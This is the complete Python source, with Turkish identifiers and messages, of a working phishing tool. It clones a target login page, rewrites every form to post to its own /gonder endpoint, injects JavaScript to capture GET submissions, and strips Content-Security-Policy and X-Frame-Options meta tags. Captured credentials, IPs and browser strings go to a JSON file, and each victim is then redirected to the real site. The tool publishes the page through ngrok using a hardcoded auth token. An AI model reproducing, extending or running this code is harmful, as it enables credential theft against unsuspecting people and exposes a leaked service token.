#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys
import requests
import os
import threading
import json
import datetime
from flask import Flask, request, redirect, Response, make_response
from bs4 import BeautifulSoup
from urllib.parse import urlparse, urljoin
import mimetypes
import re
from pyngrok import ngrok, conf, exception
import socket
from colorama import init, Fore, Back, Style
import ssl
import subprocess
import atexit
import shutil
import platform
import signal
import time
from functools import wraps

# Renkleri başlat ve gelişmiş renk paleti tanımla
init(autoreset=True)
class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    MAGENTA = '\033[35m'
    CYAN = '\033[36m'
    WHITE = '\033[37m'
    YELLOW = '\033[33m'

# Sistem kontrolü
TERMUX_MI = "com.termux" in os.environ.get('PREFIX', '')
WINDOWS_MI = platform.system() == "Windows"
LINUX_MI = platform.system() == "Linux" and not TERMUX_MI

# Özel Banner
def banner_goster():
    ekrani_temizle()
    banner = f"""
{Colors.FAIL}
██████╗ ██╗  ██╗██╗███████╗██╗  ██╗██╗███╗   ██╗ ██████╗ 
██╔══██╗██║  ██║██║██╔════╝██║  ██║██║████╗  ██║██╔════╝ 
██████╔╝███████║██║███████╗███████║██║██╔██╗ ██║██║  ███╗
██╔═══╝ ██╔══██║██║╚════██║██╔══██║██║██║╚██╗██║██║   ██║
██║     ██║  ██║██║███████║██║  ██║██║██║ ╚████║╚██████╔╝
╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝ 
{Colors.CYAN}─────────────────────────────────────────────────────
{Colors.MAGENTA}Geliştirici: {Colors.YELLOW}Gökhan Yakut {Colors.MAGENTA}| {Colors.YELLOW}Sürüm: 2.7
{Colors.CYAN}─────────────────────────────────────────────────────
{Colors.YELLOW}Platform: {Colors.OKGREEN}{'Termux' if TERMUX_MI else 'Windows' if WINDOWS_MI else 'Linux'}
{Colors.YELLOW}Ngrok: {Colors.OKGREEN}Aktif {Colors.MAGENTA}| {Colors.YELLOW}SSL: {Colors.OKGREEN}Seçimlik {Colors.MAGENTA}| {Colors.YELLOW}Token: {Colors.OKGREEN}Doğrulandı
{Colors.CYAN}─────────────────────────────────────────────────────
{Colors.YELLOW}Instagram: {Colors.CYAN}@gokhan.yakut.04
{Colors.CYAN}─────────────────────────────────────────────────────
{Colors.ENDC}
"""
    print(banner)

# Animasyonlu yazı fonksiyonu
def animasyonlu_yazi(text, delay=0.05, color=Colors.WHITE):
    for char in text:
        sys.stdout.write(color + char)
        sys.stdout.flush()
        time.sleep(delay)
    print()

# Dekoratör fonksiyonlar
def renkli_output(func):
    @wraps(func)
    def wrapper(*args, **kwargs):
        renk = kwargs.pop('renk', Colors.OKGREEN)
        return func(*args, **kwargs, color=renk)
    return wrapper

@renkli_output
def durum_yaz(mesaj, color=Colors.OKGREEN):
    print(f"{color}[+] {Colors.WHITE}{mesaj}")

@renkli_output
def hata_yaz(mesaj, color=Colors.FAIL):
    print(f"{color}[-] {Colors.WHITE}{mesaj}")

@renkli_output
def uyari_yaz(mesaj, color=Colors.WARNING):
    print(f"{color}[!] {Colors.WHITE}{mesaj}")

def ekrani_temizle():
    os.system('cls' if WINDOWS_MI else 'clear')

# Flask uygulaması
app = Flask(__name__)
app.secret_key = os.urandom(24)
hedef_url = ""
klonlanan_sayfalar = {}
kayit_dosyasi = "yakalanan_veriler.json"
ngrok_tuneli = None
mevcut_port = 8080
https_kullan = False
flask_thread = None
sunucu_calisiyor = True

# Ngrok token ayarı
NGROK_AUTH_TOKEN = "2MZRE7FsDM53KMxKyyVrPnEkXdZ_3NdnwopRAQ9ew6yt6LNYZ"

def sinyal_isleyici(sig, frame):
    global sunucu_calisiyor
    hata_yaz("\nSunucu kapatılıyor...")
    sunucu_calisiyor = False
    temizlik()
    sys.exit(0)

def temizlik():
    global ngrok_tuneli
    
    if ngrok_tuneli:
        try:
            ngrok.kill()
            durum_yaz("Ngrok tüneli kapatıldı")
        except Exception as e:
            hata_yaz(f"Ngrok kapatma hatası: {str(e)}")
    
    if flask_thread and flask_thread.is_alive():
        try:
            requests.get(f"http://127.0.0.1:{mevcut_port}/kapat", timeout=2)
            flask_thread.join(timeout=2)
        except:
            pass

@app.route('/kapat')
def kapat():
    """Flask sunucusunu kapatmak için özel endpoint"""
    func = request.environ.get('werkzeug.server.shutdown')
    if func:
        func()
    return 'Sunucu kapatılıyor...'

def ngrok_ayarla():
    try:
        conf.get_default().auth_token = NGROK_AUTH_TOKEN
        durum_yaz("Ngrok token başarıyla ayarlandı!")
        return True
    except Exception as e:
        hata_yaz(f"Ngrok token ayarlanamadı: {str(e)}")
        return False

def proxy_icerik_al(url):
    basliklar = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
        'Referer': hedef_url if hedef_url else url
    }
    
    try:
        oturum = requests.Session()
        yanit = oturum.get(url, headers=basliklar, timeout=10, verify=False)
        
        if yanit.status_code == 200:
            if 'charset' in yanit.headers.get('content-type', '').lower():
                encoding = re.search(r'charset=([\w-]+)', yanit.headers['content-type']).group(1)
            else:
                encoding = yanit.apparent_encoding
                
            icerik = yanit.content.decode(encoding or 'utf-8', errors='replace')
            return icerik.encode('utf-8'), yanit.headers.get('Content-Type', '')
        else:
            hata_yaz(f"Hedef {yanit.status_code} durum kodu döndürdü")
            return None, None
    except requests.exceptions.RequestException as e:
        hata_yaz(f"İstek hatası: {str(e)}")
        return None, None
    except Exception as e:
        hata_yaz(f"Beklenmeyen hata: {str(e)}")
        return None, None

def sayfa_duzenle(icerik, temel_url):
    try:
        corba = BeautifulSoup(icerik, 'html.parser')
        temel_netloc = urlparse(temel_url).netloc
        
        for form in corba.find_all('form'):
            orjinal_aksiyon = form.get('action', '')
            if not orjinal_aksiyon.startswith(('http://', 'https://')):
                orjinal_aksiyon = urljoin(temel_url, orjinal_aksiyon)
            
            gizli_girdi = corba.new_tag('input')
            gizli_girdi['type'] = 'hidden'
            gizli_girdi['name'] = '__phishing_kaynak'
            gizli_girdi['value'] = temel_netloc
            form.append(gizli_girdi)
            
            form['action'] = '/gonder'
            form['method'] = 'post'
            form['data-orjinal-aksiyon'] = orjinal_aksiyon
        
        js_script = corba.new_tag('script')
        js_script.string = """
        document.addEventListener('submit', function(e) {
            if(e.target.method.toLowerCase() === 'get') {
                e.preventDefault();
                const form = e.target;
                const formData = new FormData(form);
                const action = form.getAttribute('data-orjinal-aksiyon');
                
                fetch('/gonder', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                    },
                    body: new URLSearchParams(formData).toString()
                }).then(() => {
                    window.location.href = action + (action.includes('?') ? '&' : '?') + new URLSearchParams(formData).toString();
                });
            }
        });
        """
        corba.body.append(js_script)
        
        for meta in corba.find_all('meta'):
            if 'http-equiv' in meta.attrs and meta['http-equiv'].lower() in ['content-security-policy', 'x-frame-options']:
                meta.decompose()
        
        for etiket in corba.find_all(['a', 'link', 'script', 'img', 'iframe']):
            for ozellik in ['href', 'src', 'content']:
                if etiket.has_attr(ozellik):
                    url = etiket[ozellik]
                    if url.startswith('//'):
                        etiket[ozellik] = 'https:' + url
                    elif not url.startswith(('http://', 'https://', 'data:', 'javascript:')):
                        etiket[ozellik] = urljoin(temel_url, url)
        
        return str(corba)
    except Exception as e:
        hata_yaz(f"Sayfa düzenleme hatası: {str(e)}")
        return icerik.decode('utf-8') if isinstance(icerik, bytes) else icerik

@app.route('/')
def ana_sayfa():
    if hedef_url in klonlanan_sayfalar:
        return Response(klonlanan_sayfalar[hedef_url], mimetype='text/html')
    return redirect(hedef_url)

@app.route('/gonder', methods=['POST'])
def gonder():
    try:
        form_verisi = request.form.to_dict()
        kaynak = form_verisi.pop('__phishing_kaynak', request.referrer or urlparse(hedef_url).netloc)
        
        kayit = {
            'zaman': datetime.datetime.now().isoformat(),
            'kaynak': kaynak,
            'ip': request.remote_addr,
            'tarayici': request.headers.get('User-Agent', ''),
            'veri': form_verisi
        }
        
        durum_yaz(f"Yeni kimlik bilgisi yakalandı! Kaynak: {kaynak}")
        for anahtar, deger in form_verisi.items():
            print(f"{Colors.CYAN}{anahtar}: {Colors.WHITE}{deger}")
        
        try:
            mevcut_veri = []
            if os.path.exists(kayit_dosyasi):
                with open(kayit_dosyasi, 'r', encoding='utf-8') as f:
                    mevcut_veri = json.load(f)
            
            mevcut_veri.append(kayit)
            
            with open(kayit_dosyasi, 'w', encoding='utf-8') as f:
                json.dump(mevcut_veri, f, indent=2, ensure_ascii=False)
        except Exception as e:
            hata_yaz(f"Kayıt hatası: {str(e)}")
        
        return redirect(f"https://{kaynak}", code=302)
    except Exception as e:
        hata_yaz(f"Form işleme hatası: {str(e)}")
        return redirect(hedef_url)

def flask_calistir(port):
    try:
        if https_kullan:
            context = None
            if os.path.exists('sertifika.pem') and os.path.exists('anahtar.pem'):
                context = ('sertifika.pem', 'anahtar.pem')
            else:
                context = 'adhoc'
            
            app.run(host='0.0.0.0', port=port, threaded=True, ssl_context=context)
        else:
            app.run(host='0.0.0.0', port=port, threaded=True)
    except Exception as e:
        hata_yaz(f"Flask sunucu hatası: {str(e)}")

def yerel_ip_al():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('10.255.255.255', 1))
        ip = s.getsockname()[0]
    except:
        ip = '127.0.0.1'
    finally:
        s.close()
    return ip

def kendinden_imzali_sertifika_olustur():
    if not os.path.exists('sertifika.pem') or not os.path.exists('anahtar.pem'):
        durum_yaz("Kendi imzalı SSL sertifikası oluşturuluyor...")
        try:
            if not shutil.which('openssl'):
                uyari_yaz("OpenSSL bulunamadı, otomatik sertifika kullanılacak")
                return False
                
            komut = 'openssl req -x509 -newkey rsa:2048 -nodes -keyout anahtar.pem -out sertifika.pem -days 365 -subj "/CN=localhost"'
            subprocess.run(komut.split() if not WINDOWS_MI else komut, 
                         check=True,
                         shell=WINDOWS_MI,
                         stdout=subprocess.DEVNULL,
                         stderr=subprocess.DEVNULL)
            durum_yaz("SSL sertifikaları başarıyla oluşturuldu!")
            return True
        except subprocess.CalledProcessError as e:
            hata_yaz(f"Sertifika oluşturma hatası: {e.stderr.decode().strip()}")
            return False
        except Exception as e:
            hata_yaz(f"Sertifika oluşturma hatası: {str(e)}")
            return False
    return True

def ngrok_baslat(port):
    global ngrok_tuneli
    try:
        conf.get_default().region = "eu"
        conf.get_default().monitor_thread = False
        
        try:
            ngrok.kill()
        except:
            pass
        
        try:
            if https_kullan:
                ngrok_tuneli = ngrok.connect(port, bind_tls=True)
                genel_url = ngrok_tuneli.public_url.replace('http://', 'https://')
            else:
                ngrok_tuneli = ngrok.connect(port)
                genel_url = ngrok_tuneli.public_url
            
            durum_yaz(f"Ngrok başarıyla başlatıldı!")
            durum_yaz(f"Ngrok Kontrol Paneli: {Colors.CYAN}http://127.0.0.1:4040")
            return genel_url
        except exception.PyngrokNgrokError as e:
            if "account limit" in str(e).lower():
                uyari_yaz("Ngrok ücretsiz sürümünde aynı anda sadece 1 tünel açabilirsiniz")
            else:
                hata_yaz(f"Ngrok hatası: {str(e)}")
        except Exception as e:
            hata_yaz(f"Beklenmeyen hata: {str(e)}")
    except Exception as e:
        hata_yaz(f"Ngrok başlatma hatası: {str(e)}")
    return None

def port_girisi_al():
    while True:
        try:
            port = int(input(f"{Colors.OKGREEN}[?] {Colors.WHITE}Port numarası girin (varsayılan 8080): ") or 8080)
            if 1 <= port <= 65535:
                return port
            hata_yaz("Port 1-65535 aralığında olmalıdır!")
        except ValueError:
            hata_yaz("Geçersiz port numarası!")

def protokol_menusu():
    print(f"\n{Colors.YELLOW}1. {Colors.WHITE}HTTP (Hızlı, basit)")
    print(f"{Colors.YELLOW}2. {Colors.WHITE}HTTPS (Güvenli)")
    
    while True:
        secim = input(f"\n{Colors.OKGREEN}[?] {Colors.WHITE}Protokol seçin (1-2): ").strip()
        if secim in ['1', '2']:
            return secim == '2'
        hata_yaz("Lütfen 1 veya 2 girin!")

def ana_menu():
    print(f"\n{Colors.YELLOW}1. {Colors.WHITE}Sadece Yerel Ağ")
    print(f"{Colors.YELLOW}2. {Colors.WHITE}Yerel + Uzak Bağlantı (Ngrok)")
    print(f"{Colors.YELLOW}3. {Colors.WHITE}Çıkış")
    
    while True:
        secim = input(f"\n{Colors.OKGREEN}[?] {Colors.WHITE}Seçiminiz (1-3): ").strip()
        if secim in ['1', '2', '3']:
            return secim
        hata_yaz("Lütfen 1, 2 veya 3 girin!")

def hedef_url_al():
    while True:
        url = input(f"\n{Colors.OKGREEN}[?] {Colors.WHITE}Hedef URL girin (örn: https://example.com/giris): ").strip()
        if url:
            if not url.startswith(('http://', 'https://')):
                url = 'https://' + url
            try:
                yanit = requests.head(url, timeout=5, verify=False)
                if yanit.status_code < 400:
                    return url
                hata_yaz(f"URL'ye ulaşılamıyor (HTTP {yanit.status_code})")
            except requests.exceptions.RequestException as e:
                hata_yaz(f"Bağlantı hatası: {str(e)}")
            except Exception as e:
                hata_yaz(f"Geçersiz URL: {str(e)}")
        else:
            hata_yaz("URL boş olamaz!")

def main():
    global hedef_url, ngrok_tuneli, mevcut_port, https_kullan, flask_thread, sunucu_calisiyor
    
    # Sinyal işleyiciyi ayarla
    signal.signal(signal.SIGINT, sinyal_isleyici)
    
    try:
        banner_goster()
        atexit.register(temizlik)
        
        # Protokol seçimi
        animasyonlu_yazi("\nProtokol seçimi:", color=Colors.MAGENTA)
        https_kullan = protokol_menusu()
        
        # Ngrok kurulumunu kontrol et
        if not ngrok_ayarla():
            uyari_yaz("Ngrok tam olarak yapılandırılamadı, sadece yerel ağ seçeneği kullanılabilir")
        
        hedef_url = hedef_url_al()
        
        # Hedef sayfayı klonla
        animasyonlu_yazi(f"\nHedef sayfa klonlanıyor: {Colors.CYAN}{hedef_url}", color=Colors.YELLOW)
        icerik, icerik_turu = proxy_icerik_al(hedef_url)
        if not icerik:
            hata_yaz("Hedef sayfa klonlanamadı!")
            sys.exit(1)
        
        try:
            klonlanan_sayfalar[hedef_url] = sayfa_duzenle(icerik, hedef_url)
            durum_yaz("Sayfa başarıyla klonlandı ve düzenlendi!")
        except Exception as e:
            hata_yaz(f"Sayfa düzenleme hatası: {str(e)}")
            sys.exit(1)
        
        # Kayıt dosyasını oluştur
        if not os.path.exists(kayit_dosyasi):
            with open(kayit_dosyasi, 'w', encoding='utf-8') as f:
                json.dump([], f)
        
        # Port seçimi
        animasyonlu_yazi("\nPort ayarları:", color=Colors.MAGENTA)
        mevcut_port = port_girisi_al()
        
        # SSL sertifikası oluştur (HTTPS seçildiyse)
        if https_kullan and not kendinden_imzali_sertifika_olustur():
            uyari_yaz("HTTPS kurulumu başarısız, HTTP olarak devam ediliyor...")
            https_kullan = False
        
        while sunucu_calisiyor:
            banner_goster()
            secim = ana_menu()
            
            if secim == '1':
                # Yerel ağ
                yerel_ip = yerel_ip_al()
                protokol = "https" if https_kullan else "http"
                
                animasyonlu_yazi(f"\nPhishing sunucusu başlatılıyor (Port:{mevcut_port})...", color=Colors.YELLOW)
                durum_yaz(f"Yerel IP: {Colors.CYAN}{protokol}://{yerel_ip}:{mevcut_port}")
                durum_yaz(f"Yerel Makine: {Colors.CYAN}{protokol}://localhost:{mevcut_port}")
                
                flask_thread = threading.Thread(target=flask_calistir, args=(mevcut_port,), daemon=True)
                flask_thread.start()
                
                print(f"\n{Colors.YELLOW}[!] {Colors.WHITE}Sunucu çalışıyor. Durdurmak için CTRL+C tuşlarına basın")
                try:
                    while sunucu_calisiyor:
                        flask_thread.join(timeout=1)
                        if not flask_thread.is_alive():
                            break
                except KeyboardInterrupt:
                    hata_yaz("\nSunucu durduruluyor...")
                    continue
                    
            elif secim == '2':
                # Yerel + Uzak bağlantı
                yerel_ip = yerel_ip_al()
                protokol = "https" if https_kullan else "http"
                
                animasyonlu_yazi(f"\nPhishing sunucusu başlatılıyor (Port:{mevcut_port})...", color=Colors.YELLOW)
                durum_yaz(f"Yerel IP: {Colors.CYAN}{protokol}://{yerel_ip}:{mevcut_port}")
                durum_yaz(f"Yerel Makine: {Colors.CYAN}{protokol}://localhost:{mevcut_port}")
                
                # Ngrok başlat
                animasyonlu_yazi("Ngrok başlatılıyor...", color=Colors.YELLOW)
                genel_url = ngrok_baslat(mevcut_port)
                
                if genel_url:
                    durum_yaz(f"Genel URL: {Colors.CYAN}{genel_url}")
                    durum_yaz(f"Ngrok Kontrol Paneli: {Colors.CYAN}http://127.0.0.1:4040")
                else:
                    uyari_yaz("Ngrok başlatılamadı, sadece yerel ağ kullanılabilir")
                
                flask_thread = threading.Thread(target=flask_calistir, args=(mevcut_port,), daemon=True)
                flask_thread.start()
                
                print(f"\n{Colors.YELLOW}[!] {Colors.WHITE}Sunucu çalışıyor. Durdurmak için CTRL+C tuşlarına basın")
                try:
                    while sunucu_calisiyor:
                        flask_thread.join(timeout=1)
                        if not flask_thread.is_alive():
                            break
                except KeyboardInterrupt:
                    hata_yaz("\nSunucu durduruluyor...")
                    continue
                    
            elif secim == '3':
                durum_yaz("Çıkış yapılıyor...")
                sunucu_calisiyor = False
                sys.exit(0)
                
    except Exception as e:
        hata_yaz(f"Beklenmeyen hata: {str(e)}")
        sys.exit(1)

if __name__ == '__main__':
    main()